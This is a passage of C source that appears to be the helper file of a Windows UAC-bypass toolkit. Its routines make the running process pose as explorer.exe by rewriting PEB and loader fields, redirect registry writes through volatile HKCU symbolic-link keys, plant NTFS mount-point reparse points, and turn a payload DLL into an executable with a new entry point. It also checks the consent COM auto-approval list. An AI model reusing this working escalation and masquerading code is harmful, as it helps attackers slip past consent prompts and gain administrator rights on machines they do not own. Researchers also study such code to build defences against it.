    _Inout_ BOOLEAN *StopEnumeration
)
{
    PPEB Peb = NtCurrentPeb();
    PWSTR FullDllName, BaseDllName;

    BOOL Restore = PtrToInt(Context);

    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {

        if (Restore) {
            FullDllName = g_LdrBackup.lpFullDllName;
            BaseDllName = g_LdrBackup.lpBaseDllName;
        }
        else {
            g_LdrBackup.lpBaseDllName = DataTableEntry->BaseDllName.Buffer;
            g_LdrBackup.lpFullDllName = DataTableEntry->FullDllName.Buffer;
            FullDllName = g_lpszExplorer;
            BaseDllName = EXPLORER_EXE;
        }

        RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);

        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

/*
* supMasqueradeProcess
*
* Purpose:
*
* Fake/Restore current process information.
*
*/
VOID supMasqueradeProcess(
    _In_ BOOL Restore
)
{
    NTSTATUS    Status;
    PPEB        Peb = NtCurrentPeb();
    SIZE_T      RegionSize;

    PWSTR ImageFileName, CommandLine;

    if (Restore == FALSE) {

        g_lpszExplorer = NULL;
        RegionSize = 0x1000;
        Status = NtAllocateVirtualMemory(
            NtCurrentProcess(),
            &g_lpszExplorer,
            0,
            &RegionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (NT_SUCCESS(Status)) {
            _strcpy(g_lpszExplorer, g_ctx.szSystemRoot);
            _strcat(g_lpszExplorer, EXPLORER_EXE);
        }
        else {
            supSetLastErrorFromNtStatus(Status);
            return;
        }
    }

    RtlAcquirePebLock();

    if (Restore) {
        CommandLine = g_LdrBackup.CommandLine;
        ImageFileName = g_LdrBackup.ImagePathName;
    }
    else {
        g_LdrBackup.ImagePathName = Peb->ProcessParameters->ImagePathName.Buffer;
        g_LdrBackup.CommandLine = Peb->ProcessParameters->CommandLine.Buffer;

        ImageFileName = g_lpszExplorer;
        CommandLine = EXPLORER_EXE;
    }

    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);

    if (Restore) {

        RegionSize = 0;
        NtFreeVirtualMemory(
            NtCurrentProcess(),
            &g_lpszExplorer,
            &RegionSize,
            MEM_RELEASE);

        g_lpszExplorer = NULL;

    }

    RtlReleasePebLock();

    LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, IntToPtr(Restore));
}

/*
* supExpandEnvironmentStrings
*
* Purpose:
*
* Native ExpandEnvironmetStrings.
*
*/
DWORD supExpandEnvironmentStrings(
    _In_ LPCWSTR lpSrc,
    _In_ LPWSTR lpDst,
    _In_ DWORD nSize
)
{
    NTSTATUS Status;
    UNICODE_STRING Source, Destination;
    ULONG Length;
    DWORD iSize;

    if (nSize > (MAXUSHORT >> 1) - 2) {
        iSize = (MAXUSHORT >> 1) - 2;
    }
    else {
        iSize = nSize;
    }

    RtlInitUnicodeString(&Source, lpSrc);
    Destination.Buffer = lpDst;
    Destination.Length = 0;
    Destination.MaximumLength = (USHORT)(iSize * sizeof(WCHAR));
    Length = 0;
    Status = RtlExpandEnvironmentStrings_U(NULL,
        &Source,
        &Destination,
        &Length
    );
    if (NT_SUCCESS(Status) || Status == STATUS_BUFFER_TOO_SMALL) {
        return (DWORD)(Length / sizeof(WCHAR));
    }
    else {
        supSetLastErrorFromNtStatus(Status);
        return 0;
    }
}

/*
* sxsFilePathNoSlash
*
* Purpose:
*
* same as _filepath except it doesnt return last slash.
*
*/
wchar_t *sxsFilePathNoSlash(
    const wchar_t *fname,
    wchar_t *fpath
)
{
    wchar_t *p = (wchar_t *)fname, *p0 = (wchar_t*)fname, *p1 = (wchar_t*)fpath;

    if ((fname == 0) || (fpath == NULL))
        return 0;

    while (*fname != (wchar_t)0) {
        if (*fname == '\\')
            p = (wchar_t *)fname;
        fname++;
    }

    while (p0 < p) {
        *p1 = *p0;
        p1++;
        p0++;
    }
    *p1 = 0;

    return fpath;
}

/*
* sxsFindLoaderEntry
*
* Purpose:
*
* Return loader entry filename for sxs dll.
*
*/
BOOL sxsFindLoaderEntry(
    _In_ PSXS_SEARCH_CONTEXT Context
)
{
    NTSTATUS Status;
    HANDLE hDll = NULL;
    UNICODE_STRING usDll;

    PLDR_DATA_TABLE_ENTRY LdrTableEntry = NULL;

    RtlInitUnicodeString(&usDll, Context->DllName);

    Status = LdrGetDllHandle(
        NULL,
        NULL,
        &usDll,
        &hDll);

    if (NT_SUCCESS(Status)) {

        Status = LdrFindEntryForAddress(
            hDll,
            &LdrTableEntry);

        if (NT_SUCCESS(Status)) {

            if (_strstri(
                LdrTableEntry->FullDllName.Buffer,
                L".local") == NULL)
            {
                if (_strstri(
                    LdrTableEntry->FullDllName.Buffer,
                    Context->SxsKey))
                {
                    sxsFilePathNoSlash(
                        LdrTableEntry->FullDllName.Buffer,
                        Context->FullDllPath);

                }
                else
                    Status = STATUS_NOT_FOUND;
            }
            else
                Status = STATUS_TOO_LATE;
        }
    }

    return NT_SUCCESS(Status);
}

/*
* supFindPattern
*
* Purpose:
*
* Lookup pattern in buffer.
*
*/
PVOID supFindPattern(
    _In_ CONST PBYTE Buffer,
    _In_ SIZE_T BufferSize,
    _In_ CONST PBYTE Pattern,
    _In_ SIZE_T PatternSize
)
{
    PBYTE	p = Buffer;

    if (PatternSize == 0)
        return NULL;
    if (BufferSize < PatternSize)
        return NULL;
    BufferSize -= PatternSize;

    do {
        p = memchr(p, Pattern[0], BufferSize - (p - Buffer));
        if (p == NULL)
            break;

        if (memcmp(p, Pattern, PatternSize) == 0)
            return p;

        p++;
    } while (BufferSize - (p - Buffer) > 0); //-V555

    return NULL;
}

/*
* supNativeGetProcAddress
*
* Purpose:
*
* Simplified native GetProcAddress.
*
*/
PVOID supNativeGetProcAddress(
    _In_ WCHAR *Module,
    _In_ CHAR *Routine
)
{
    PVOID            DllImageBase = NULL, ProcedureAddress = NULL;
    UNICODE_STRING   DllName;
    ANSI_STRING      str;

    RtlInitUnicodeString(&DllName, Module);
    if (!NT_SUCCESS(LdrGetDllHandle(NULL, NULL, &DllName, &DllImageBase)))
        return NULL;

    RtlSecureZeroMemory(&str, sizeof(str));
    RtlInitString(&str, Routine);
    if (!NT_SUCCESS(LdrGetProcedureAddress(DllImageBase, &str, 0, &ProcedureAddress)))
        return NULL;

    return ProcedureAddress;
}

/*
* supxDeleteKeyRecursive
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
*/
BOOL supxDeleteKeyRecursive(
    _In_ HKEY hKeyRoot,
    _In_ LPWSTR lpSubKey)
{
    LPWSTR lpEnd;
    LONG lResult;
    DWORD dwSize;
    WCHAR szName[MAX_PATH + 1];
    HKEY hKey;
    FILETIME ftWrite;

    //
    // Attempt to delete key as is.
    //
    lResult = RegDeleteKey(hKeyRoot, lpSubKey);
    if (lResult == ERROR_SUCCESS)
        return TRUE;

    //
    // Try to open key to check if it exist.
    //
    lResult = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
    if (lResult != ERROR_SUCCESS) {
        if (lResult == ERROR_FILE_NOT_FOUND)
            return TRUE;
        else
            return FALSE;
    }

    //
    // Add slash to the key path if not present.
    //
    lpEnd = _strend(lpSubKey);
    if (*(lpEnd - 1) != TEXT('\\')) {
        *lpEnd = TEXT('\\');
        lpEnd++;
        *lpEnd = TEXT('\0');
    }

    //
    // Enumerate subkeys and call this func for each.
    //
    dwSize = MAX_PATH;
    lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
        NULL, NULL, &ftWrite);

    if (lResult == ERROR_SUCCESS) {

        do {

            _strncpy(lpEnd, MAX_PATH, szName, MAX_PATH);

            if (!supxDeleteKeyRecursive(hKeyRoot, lpSubKey))
                break;

            dwSize = MAX_PATH;

            lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
                NULL, NULL, &ftWrite);

        } while (lResult == ERROR_SUCCESS);
    }

    lpEnd--;
    *lpEnd = TEXT('\0');

    RegCloseKey(hKey);

    //
    // Delete current key, all it subkeys should be already removed.
    //
    lResult = RegDeleteKey(hKeyRoot, lpSubKey);
    if (lResult == ERROR_SUCCESS)
        return TRUE;

    return FALSE;
}

/*
* supRegDeleteKeyRecursive
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
* Remark:
*
* SubKey should not be longer than 260 chars.
*
*/
BOOL supRegDeleteKeyRecursive(
    _In_ HKEY hKeyRoot,
    _In_ LPWSTR lpSubKey)
{
    WCHAR szKeyName[MAX_PATH * 2];
    RtlSecureZeroMemory(szKeyName, sizeof(szKeyName));
    _strncpy(szKeyName, MAX_PATH * 2, lpSubKey, MAX_PATH);
    return supxDeleteKeyRecursive(hKeyRoot, szKeyName);
}

/*
* supSetEnvVariable
*
* Purpose:
*
* Remove or set current user environment variable.
*
*/
BOOL supSetEnvVariable(
    _In_ BOOL fRemove,
    _In_opt_ LPWSTR lpKeyName,
    _In_ LPWSTR lpVariableName,
    _In_opt_ LPWSTR lpVariableData
)
{
    BOOL    bResult = FALSE, bCond = FALSE;
    HKEY    hKey = NULL;
    DWORD   cbData;

    LPWSTR lpSubKey;

    do {
        if (lpVariableName == NULL)
            break;

        if (lpKeyName == NULL)
            lpSubKey = L"Environment";
        else
            lpSubKey = lpKeyName;

        if ((lpVariableData == NULL) && (fRemove == FALSE))
            break;

        if (RegOpenKey(HKEY_CURRENT_USER, lpSubKey, &hKey) != ERROR_SUCCESS)
            break;

        if (fRemove) {
            bResult = (RegDeleteValue(hKey, lpVariableName) == ERROR_SUCCESS);
        }
        else {
            cbData = (DWORD)((1 + _strlen(lpVariableData)) * sizeof(WCHAR));
            bResult = (RegSetValueEx(hKey, lpVariableName, 0, REG_SZ,
                (BYTE*)lpVariableData, cbData) == ERROR_SUCCESS);
        }

    } while (bCond);

    if (hKey != NULL)
        RegCloseKey(hKey);

    return bResult;
}

/*
* supDeleteMountPoint
*
* Purpose:
*
* Removes reparse point of type mount_point.
*
*/
BOOL supDeleteMountPoint(
    _In_ HANDLE hDirectory
)
{
    NTSTATUS        status;
    IO_STATUS_BLOCK IoStatusBlock;

    REPARSE_GUID_DATA_BUFFER Buffer;

    RtlSecureZeroMemory(&Buffer, sizeof(REPARSE_GUID_DATA_BUFFER));
    Buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;

    status = NtFsControlFile(hDirectory,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        FSCTL_DELETE_REPARSE_POINT,
        &Buffer,
        REPARSE_GUID_DATA_BUFFER_HEADER_SIZE,
        NULL,
        0);

    if (status == STATUS_NOT_A_REPARSE_POINT) {
        SetLastError(ERROR_INVALID_PARAMETER);
    }
    else {
        supSetLastErrorFromNtStatus(status);
    }

    return NT_SUCCESS(status);
}

/*
* supSetMountPoint
*
* Purpose:
*
* Install reparse point of type mount_point to target.
*
*/
BOOL supSetMountPoint(
    _In_ HANDLE hDirectory,
    _In_ LPWSTR lpTarget,
    _In_ LPWSTR lpPrintName
)
{
    ULONG           memIO;
    USHORT          cbTarget, cbPrintName, reparseDataLength;
    NTSTATUS        status;
    IO_STATUS_BLOCK IoStatusBlock;

    REPARSE_DATA_BUFFER *Buffer;

    if ((lpTarget == NULL) || (lpPrintName == NULL)) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    //
    // Calculate required buffer size.
    // Header + length of input strings + safe space.
    //
    cbTarget = (USHORT)(_strlen(lpTarget) * sizeof(WCHAR));
    cbPrintName = (USHORT)(_strlen(lpPrintName) * sizeof(WCHAR));

    reparseDataLength = cbTarget + cbPrintName + 12;
    memIO = (ULONG)(reparseDataLength + REPARSE_DATA_BUFFER_HEADER_LENGTH);

    Buffer = supHeapAlloc((SIZE_T)memIO);
    if (Buffer == NULL)
        return FALSE;

    //
    // Setup reparse point structure.
    //
    Buffer->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Buffer->ReparseDataLength = reparseDataLength;

    //
    // Add Target to PathBuffer.
    //
    Buffer->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Buffer->MountPointReparseBuffer.SubstituteNameLength = cbTarget;

    RtlCopyMemory(Buffer->MountPointReparseBuffer.PathBuffer,
        lpTarget,
        cbTarget);

    //
    // Add PrintName to PathBuffer.
    //
    Buffer->MountPointReparseBuffer.PrintNameOffset = cbTarget + sizeof(UNICODE_NULL);
    Buffer->MountPointReparseBuffer.PrintNameLength = cbPrintName;

    RtlCopyMemory(&Buffer->MountPointReparseBuffer.PathBuffer[(cbTarget / sizeof(WCHAR)) + 1],
        lpPrintName,
        cbPrintName);

    //
    // Set reparse point.
    //
    status = NtFsControlFile(hDirectory,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        FSCTL_SET_REPARSE_POINT,
        Buffer,
        memIO,
        NULL,
        0);

    supHeapFree(Buffer);

    supSetLastErrorFromNtStatus(status);
    return NT_SUCCESS(status);
}

/*
* supOpenDirectoryForReparse
*
* Purpose:
*
* Open directory handle to set reparse point.
*
*/
HANDLE supOpenDirectoryForReparse(
    _In_ LPWSTR lpDirectory
)
{
    NTSTATUS            status = STATUS_UNSUCCESSFUL;
    HANDLE              hReparseDirectory = NULL;
    UNICODE_STRING      usReparseDirectory;
    IO_STATUS_BLOCK     IoStatusBlock;
    OBJECT_ATTRIBUTES   ObjectAttributes;

    usReparseDirectory.Buffer = NULL;
    if (RtlDosPathNameToNtPathName_U(lpDirectory, &usReparseDirectory, NULL, NULL)) {

        InitializeObjectAttributes(&ObjectAttributes, &usReparseDirectory, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status = NtCreateFile(&hReparseDirectory,
            FILE_ALL_ACCESS,
            &ObjectAttributes,
            &IoStatusBlock,
            NULL,
            0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_OPEN,
            FILE_OPEN_REPARSE_POINT | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);

        RtlFreeUnicodeString(&usReparseDirectory);
    }

    supSetLastErrorFromNtStatus(status);

    return hReparseDirectory;
}

/*
* supSetupIPCLinkData
*
* Purpose:
*
* Setup shared variable.
*
*/
BOOL supSetupIPCLinkData(
    VOID
)
{
    BOOL bCond = FALSE, bResult = FALSE;
    HANDLE hRoot = NULL, hChild = NULL;
    LPWSTR lpUser;
    NTSTATUS status;
    UNICODE_STRING ChildName, usKey;
    OBJECT_ATTRIBUTES attr;
    UNICODE_STRING ParentRoot = RTL_CONSTANT_STRING(T_AKAGI_LINK);

    RtlSecureZeroMemory(&usKey, sizeof(usKey));

    do {
        status = RtlFormatCurrentUserKeyPath(&usKey);
        if (!NT_SUCCESS(status))
            break;

        lpUser = _filename(usKey.Buffer);

        InitializeObjectAttributes(&attr, &ParentRoot, OBJ_CASE_INSENSITIVE, 0, NULL);
        status = NtCreateDirectoryObject(&hRoot, DIRECTORY_CREATE_SUBDIRECTORY, &attr);
        if (!NT_SUCCESS(status))
            break;

        RtlInitUnicodeString(&ChildName, lpUser);
        attr.RootDirectory = hRoot;
        attr.ObjectName = &ChildName;
        status = NtCreateDirectoryObject(&hChild, DIRECTORY_ALL_ACCESS, &attr);
        if (!NT_SUCCESS(status))
            break;

        bResult = TRUE;

    } while (bCond);

    //
    // Cleanup created objects if something went wrong.
    // Otherwise objects will die together with process at exit.
    //
    if (bResult == FALSE) {
        if (hRoot) {
            NtClose(hRoot);
        }
        if (hChild) {
            NtClose(hChild);
        }
    }

    if (usKey.Buffer) {
        RtlFreeUnicodeString(&usKey);
    }
    return bResult;
}

/*
* supWinstationToName
*
* Purpose:
*
* Retrieves winstation string name.
*
*/
BOOL supWinstationToName(
    _In_opt_ HWINSTA hWinsta,
    _In_ LPWSTR lpBuffer,
    _In_ DWORD cbBuffer,
    _Out_ PDWORD BytesNeeded
)
{
    HWINSTA hObject;

    if (hWinsta == NULL)
        hObject = GetProcessWindowStation();
    else
        hObject = hWinsta;

    return GetUserObjectInformation(
        hObject,
        UOI_NAME,
        lpBuffer,
        cbBuffer,
        BytesNeeded);
}

/*
* supDesktopToName
*
* Purpose:
*
* Retrieves desktop string name.
*
*/
BOOL supDesktopToName(
    _In_opt_ HDESK hDesktop,
    _In_ LPWSTR lpBuffer,
    _In_ DWORD cbBuffer,
    _Out_ PDWORD BytesNeeded
)
{
    HDESK hObject;

    if (hDesktop == NULL)
        hObject = GetThreadDesktop(GetCurrentThreadId());
    else
        hObject = hDesktop;

    return GetUserObjectInformation(
        hObject,
        UOI_NAME,
        lpBuffer,
        cbBuffer,
        BytesNeeded);
}

/*
* supQueryNtBuildNumber
*
* Purpose:
*
* Query NtBuildNumber value from ntoskrnl image.
*
*/
BOOL supQueryNtBuildNumber(
    _Inout_ PULONG BuildNumber
)
{
    BOOL bResult = FALSE;
    HMODULE hModule;
    PVOID Ptr;
    WCHAR szBuffer[MAX_PATH * 2];

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
    _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
    _strcat(szBuffer, L"\\system32\\ntoskrnl.exe");

    hModule = LoadLibraryEx(szBuffer, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hModule == NULL)
        return bResult;

#pragma warning(push)
#pragma warning(disable: 4054)//code to data
    Ptr = (PVOID)GetProcAddress(hModule, "NtBuildNumber");
#pragma warning(pop)
    if (Ptr) {
        *BuildNumber = (*(PULONG)Ptr & 0xffff);
        bResult = TRUE;
    }
    FreeLibrary(hModule);
    return bResult;
}

/*
* supConvertDllToExeSetNewEP
*
* Purpose:
*
* Convert payload dll to exe and set new entrypoint.
*
*/
BOOL supConvertDllToExeSetNewEP(
    _In_ PVOID pvImage,
    _In_ ULONG dwImageSize,
    _In_ LPSTR lpszEntryPoint
)
{
    BOOL              bResult = FALSE;
    PIMAGE_NT_HEADERS NtHeaders;
    DWORD             DllVirtualSize;
    PVOID             EntryPoint, DllBase;

    NtHeaders = RtlImageNtHeader(pvImage);
    if (NtHeaders != NULL) {

        //
        // Preload image.
        //
        DllVirtualSize = 0;
        DllBase = PELoaderLoadImage(pvImage, &DllVirtualSize);
        if (DllBase != NULL) {

            //
            // Get the new entrypoint from target export.
            //
            EntryPoint = PELoaderGetProcAddress(DllBase, lpszEntryPoint);
            if (EntryPoint != NULL) {

                //
                // Set new entrypoint and recalculate checksum.
                //
                NtHeaders->OptionalHeader.AddressOfEntryPoint =
                    (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);

                NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;

                NtHeaders->OptionalHeader.CheckSum =
                    supCalculateCheckSumForMappedFile(pvImage, dwImageSize);

                bResult = TRUE;
            }

            VirtualFree(DllBase, 0, MEM_RELEASE);
        }
    }
    return bResult;
}

/*
* supQuerySystemRoot
*
* Purpose:
*
* Query system root value from registry to the program global context.
*
*/
BOOL supQuerySystemRoot(
    VOID)
{
    BOOL                bCond = FALSE, bResult = FALSE, needBackslash = FALSE;
    NTSTATUS            Status;
    UNICODE_STRING      UString;
    OBJECT_ATTRIBUTES   ObjectAttributes;

    PWCHAR              lpData = NULL;
    SIZE_T              ccm = 0, cch = 0;
    HANDLE              hKey = NULL;

    WCHAR               szBuffer[MAX_PATH];
    WCHAR               szSystem32Prep[] = { L's', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', 0 };

    ULONG               Length = 0, cbSystem32Prep = sizeof(szSystem32Prep) - sizeof(WCHAR);

    do {
        _strcpy(szBuffer, T_REGISTRY_PREP);
        _strcat(szBuffer, T_WINDOWS_CURRENT_VERSION);
        RtlInitUnicodeString(&UString, szBuffer);

        InitializeObjectAttributes(&ObjectAttributes, &UString, OBJ_CASE_INSENSITIVE, NULL, NULL);
        Status = NtOpenKey(&hKey, KEY_READ, &ObjectAttributes);
        if (!NT_SUCCESS(Status))
            break;

        Status = supRegReadValue(hKey, L"SystemRoot", REG_SZ, &lpData, &Length, g_ctx.ucmHeap);
        if (!NT_SUCCESS(Status))
            break;

        ccm = Length / sizeof(WCHAR);
        cch = ccm;
        if (lpData[cch - 1] != L'\\') {
            ccm++;
            needBackslash = TRUE;
        }
        else {
            needBackslash = FALSE;
        }

        ccm += (cbSystem32Prep / sizeof(WCHAR));

        if (ccm >= MAX_PATH) {
            SetLastError(ERROR_BUFFER_OVERFLOW);
            break;
        }

        _strncpy(g_ctx.szSystemRoot, MAX_PATH, lpData, cch);
        if (needBackslash) {
            g_ctx.szSystemRoot[cch - 1] = L'\\';
        }

        _strcpy(g_ctx.szSystemDirectory, g_ctx.szSystemRoot);
        _strcat(g_ctx.szSystemDirectory, szSystem32Prep);

        bResult = TRUE;

    } while (bCond);

    if (hKey) NtClose(hKey);
    if (lpData) supHeapFree(lpData);

    return bResult;
}

/*
* supGetSystemInfo
*
* Purpose:
*
* Returns buffer with system information by given InfoClass.
*
* Returned buffer must be freed with supHeapFree after usage.
* Function will return error after 20 attempts.
*
*/
PVOID supGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS InfoClass
)
{
    INT			c = 0;
    PVOID		Buffer = NULL;
    ULONG		Size = 0x1000;
    NTSTATUS	status;
    ULONG       memIO;

    do {
        Buffer = supHeapAlloc((SIZE_T)Size);
        if (Buffer != NULL) {
            status = NtQuerySystemInformation(InfoClass, Buffer, Size, &memIO);
        }
        else {
            return NULL;
        }
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            supHeapFree(Buffer);
            Buffer = NULL;
            Size *= 2;
            c++;
            if (c > 20) {
                status = STATUS_SECRET_TOO_LONG;
                break;
            }
        }
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (NT_SUCCESS(status)) {
        return Buffer;
    }

    if (Buffer) {
        supHeapFree(Buffer);
    }
    return NULL;
}

/*
* supIsCorImageFile
*
* Purpose:
*
* Return true if image has CliHeader entry, false otherwise.
*
*/
BOOL supIsCorImageFile(
    PVOID ImageBase
)
{
    BOOL                bResult = FALSE;
    ULONG               sz = 0;
    IMAGE_COR20_HEADER *CliHeader;

    if (ImageBase) {
        CliHeader = RtlImageDirectoryEntryToData(ImageBase, TRUE,
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR, &sz);

        if ((CliHeader == NULL) || (sz < sizeof(IMAGE_COR20_HEADER)))
            return bResult;
        bResult = TRUE;
    }
    return bResult;
}

/*
* supRegSetValueIndirectHKCU
*
* Purpose:
*
* Indirectly set registry Value for TargetKey in the current user hive.
*
*/
NTSTATUS supRegSetValueIndirectHKCU(
    _In_ LPWSTR TargetKey,
    _In_opt_ LPWSTR ValueName,
    _In_ LPWSTR lpData,
    _In_ ULONG cbData
)
{
    BOOL bCond = FALSE;
    HANDLE hKey = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    UNICODE_STRING usCurrentUser, usLinkPath;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING CmSymbolicLinkValue = RTL_CONSTANT_STRING(L"SymbolicLinkValue");

    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;

    SIZE_T memIO;

    PWSTR lpLinkKeyBuffer = NULL, lpBuffer = NULL;
    ULONG cbKureND = sizeof(T_SYMLINK) - sizeof(WCHAR);
    ULONG dummy;

    status = RtlFormatCurrentUserKeyPath(&usCurrentUser);
    if (!NT_SUCCESS(status))
        return status;

    do {

        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + cbKureND;
        lpLinkKeyBuffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpLinkKeyBuffer == NULL)
            break;

        usLinkPath.Buffer = lpLinkKeyBuffer;
        usLinkPath.Length = 0;
        usLinkPath.MaximumLength = (USHORT)memIO;

        status = RtlAppendUnicodeStringToString(&usLinkPath, &usCurrentUser);
        if (!NT_SUCCESS(status))
            break;

        status = RtlAppendUnicodeToString(&usLinkPath, T_SYMLINK);
        if (!NT_SUCCESS(status))
            break;

        InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

        //
        // Create link key.
        //
        status = NtCreateKey(&hKey, KEY_ALL_ACCESS,
            &obja, 0, NULL,
            REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,
            &dummy);

        //
        // If link already created, update it.
        //
        if (status == STATUS_OBJECT_NAME_COLLISION) {

            obja.Attributes |= OBJ_OPENLINK;

            status = NtOpenKey(&hKey,
                KEY_ALL_ACCESS,
                &obja);

        }

        if (!NT_SUCCESS(status))
            break;

        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + ((1 + _strlen(TargetKey)) * sizeof(WCHAR));
        lpBuffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpBuffer == NULL)
            break;

        _strcpy(lpBuffer, usCurrentUser.Buffer);
        _strcat(lpBuffer, L"\\");
        _strcat(lpBuffer, TargetKey);

        memIO = _strlen(lpBuffer) * sizeof(WCHAR); //no null termination
        status = NtSetValueKey(hKey, &CmSymbolicLinkValue, 0, REG_LINK, (PVOID)lpBuffer, (ULONG)memIO);
        NtClose(hKey);
        hKey = NULL;

        if (!NT_SUCCESS(status))
            break;

        //
        // Set value indirect.
        //
        obja.Attributes = OBJ_CASE_INSENSITIVE;
        status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
        if (NT_SUCCESS(status)) {

            //
            // If this is Default value - supply empty US.
            //
            if (ValueName == NULL) {
                RtlSecureZeroMemory(&usLinkPath, sizeof(usLinkPath));
            }
            else {
                RtlInitUnicodeString(&usLinkPath, ValueName);
            }
            status = NtSetValueKey(hKey, &usLinkPath, 0, REG_SZ, (PVOID)lpData, (ULONG)cbData);
            NtClose(hKey);
            hKey = NULL;
        }

    } while (bCond);

    if (lpLinkKeyBuffer) RtlFreeHeap(hHeap, 0, lpLinkKeyBuffer);
    if (lpBuffer) RtlFreeHeap(hHeap, 0, lpBuffer);
    if (hKey) NtClose(hKey);
    RtlFreeUnicodeString(&usCurrentUser);

    return status;
}

/*
* supRemoveRegLinkHKCU
*
* Purpose:
*
* Remove registry symlink for current user.
*
*/
NTSTATUS supRemoveRegLinkHKCU(
    VOID
)
{
    BOOL bCond = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    ULONG cbKureND = sizeof(T_SYMLINK) - sizeof(WCHAR);

    UNICODE_STRING usCurrentUser, usLinkPath;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING CmSymbolicLinkValue = RTL_CONSTANT_STRING(L"SymbolicLinkValue");

    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;

    PWSTR lpLinkKeyBuffer = NULL;
    SIZE_T memIO;

    HANDLE hKey = NULL;

    InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = RtlFormatCurrentUserKeyPath(&usCurrentUser);
    if (!NT_SUCCESS(status))
        return status;

    do {

        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + cbKureND;
        lpLinkKeyBuffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpLinkKeyBuffer == NULL)
            break;

        usLinkPath.Buffer = lpLinkKeyBuffer;
        usLinkPath.Length = 0;
        usLinkPath.MaximumLength = (USHORT)memIO;

        status = RtlAppendUnicodeStringToString(&usLinkPath, &usCurrentUser);
        if (!NT_SUCCESS(status))
            break;

        status = RtlAppendUnicodeToString(&usLinkPath, T_SYMLINK);
        if (!NT_SUCCESS(status))
            break;

        InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE | OBJ_OPENLINK, NULL, NULL);

        status = NtOpenKey(&hKey,
            KEY_ALL_ACCESS,
            &obja);

        if (NT_SUCCESS(status)) {

            status = NtDeleteValueKey(hKey, &CmSymbolicLinkValue);
            if (NT_SUCCESS(status))
                status = NtDeleteKey(hKey);

            NtClose(hKey);
        }

    } while (bCond);

    if (lpLinkKeyBuffer) RtlFreeHeap(hHeap, 0, lpLinkKeyBuffer);
    RtlFreeUnicodeString(&usCurrentUser);

    return status;
}

/*
* supExecuteWithDelay
*
* Purpose:
*
* Delayed procedure execution.
*
*/
BOOL supExecuteWithDelay(
    _In_ ULONG Milliseconds,
    _In_opt_ PTIMER_APC_ROUTINE CompletionRoutine,
    _In_opt_ PVOID CompletionParameter
)
{
    BOOL bResult = FALSE;
    HANDLE hTimer = NULL;
    LARGE_INTEGER liDueTime; 
    OBJECT_ATTRIBUTES obja;

    liDueTime.QuadPart = -(LONGLONG)UInt32x32To64(Milliseconds, 10000);

    InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
    
    if (NT_SUCCESS(NtCreateTimer(&hTimer,
        TIMER_ALL_ACCESS,
        &obja,
        NotificationTimer))) 
    {
        if (NT_SUCCESS(NtSetTimer(
            hTimer,
            &liDueTime,
            CompletionRoutine,
            CompletionParameter,
            FALSE,
            0,
            NULL)))
        {
            liDueTime.QuadPart = 0x8000000000000000; //INFINITE
            bResult = (NT_SUCCESS(NtWaitForSingleObject(hTimer, FALSE, &liDueTime)));
        }
        NtClose(hTimer);
    }
    return bResult;
}

/*
* supIsConsentApprovedInterface
*
* Purpose:
*
* Test if the given interface is in consent COMAutoApprovalList.
*
*/
_Success_(return != FALSE)
BOOL supIsConsentApprovedInterface(
    _In_ LPWSTR InterfaceName,
    _Out_ PBOOL IsApproved
)
{
    BOOL                bResult = FALSE;

    UNICODE_STRING      usKey = RTL_CONSTANT_STRING(T_COMAUTOAPPROVALLIST);
    OBJECT_ATTRIBUTES   obja;
    NTSTATUS            status = STATUS_UNSUCCESSFUL;
    ULONG               dummy;

    HKEY                hKey = NULL;

